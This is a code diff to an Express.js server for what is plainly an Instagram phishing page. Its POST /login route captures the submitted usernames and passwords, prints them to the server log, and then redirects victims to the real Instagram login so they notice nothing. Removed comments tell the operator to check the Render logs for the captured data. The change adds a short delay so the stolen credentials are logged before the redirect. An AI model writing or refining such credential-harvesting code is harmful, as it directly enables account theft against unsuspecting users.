@@ -14,16 +14,18 @@ app.use(express.urlencoded({ extended: true }));
 // **CRITICAL: The Route that Captures the Data**
 app.post('/login', (req, res) => {
     const { username, password } = req.body;
-
-    // A IMPORTANT: The captured data is printed to your server's log.
-    // If you host this on Render, you must check the Render logs to see this data!
+    
+    // Log the credentials immediately
     console.log(`--- New Login Attempt ---`);
     console.log(`Username: ${username}`);
     console.log(`Password: ${password}`);
     console.log(`-------------------------`);
-    
-    // Redirect the user to the real Instagram login page for a seamless experience
-    res.redirect('https://www.instagram.com/accounts/login/');
+
+    // Add a slight delay to ensure the log is processed before the function exits
+    setTimeout(() => {
+        // Now, redirect the user
+        res.redirect('https://www.instagram.com/accounts/login/');
+    }, 100); // Wait 100 milliseconds
 });
 
 // Start the server listening
